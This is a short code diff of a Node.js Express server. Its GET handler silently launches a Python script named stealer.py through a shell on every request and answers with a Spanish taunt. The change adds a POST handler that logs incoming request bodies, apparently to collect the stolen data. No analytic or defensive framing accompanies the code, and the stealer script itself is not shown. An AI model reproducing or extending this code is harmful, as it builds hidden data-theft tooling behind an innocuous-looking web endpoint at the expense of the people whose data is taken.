@@ -19,6 +19,8 @@ app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
   spawn("python ./stealer.py", { shell: true });
   res.send({uo:"pillado huron"})
-
 })
 
+app.post('/', (req, res) => {
+  console.log(req.body)
+})
